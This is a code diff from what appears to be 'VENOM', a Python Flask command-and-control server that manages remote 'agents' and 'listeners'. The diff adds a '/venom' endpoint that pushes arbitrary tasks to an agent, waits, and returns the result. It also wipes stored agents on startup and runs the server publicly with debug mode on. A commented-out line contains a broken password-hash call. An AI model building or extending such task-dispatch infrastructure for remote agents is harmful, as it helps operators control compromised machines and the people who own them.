@@ -178,12 +178,34 @@ if __name__ == "__main__":
         return agents , 200 
 
 
+    @app.route('/venom', methods= ['POST'])
+    @token_required(_SECRET_)
+    def venom(): 
+        if(request.json.get('id') and request.json.get('task')): 
+            try: 
+                assignTask(request.json.get('id'), request.json.get('task')) 
+                #Wait for maximum time to make sure result is sent back by agent.
+                time.sleep(20)
+                taskResult = readTaskResult(request.json.get('id'))
+                if(taskResult): 
+                    temp = taskResult
+                    clearTaskResult(request.json.get('id')) 
+                    return temp
+                     
+                else: 
+                    return 'Agent didn\'t return a response or some error occured', 200
+            except: 
+
+                return 'Error!' , 206
+
+
     parser = ArgumentParser(description='Welcome to VENOM')
     parser.add_argument('--port', type=int, required=True,
                         default='8080', help='Port number, Default set to 8080')
     args = parser.parse_args()
     migrate()
     register(db.listeners.delete_many,{})
+    register(db.agents.delete_many,{})
     app.run(host='0.0.0.0', port=args.port, debug=True)
     # if(db.venom.find_one({'username': {'$eq': 'admin' }, 'password': {'$eq': "admin".encode('utf-8').hexdigest()} })):
     #   _REG_FLAG_ = 1
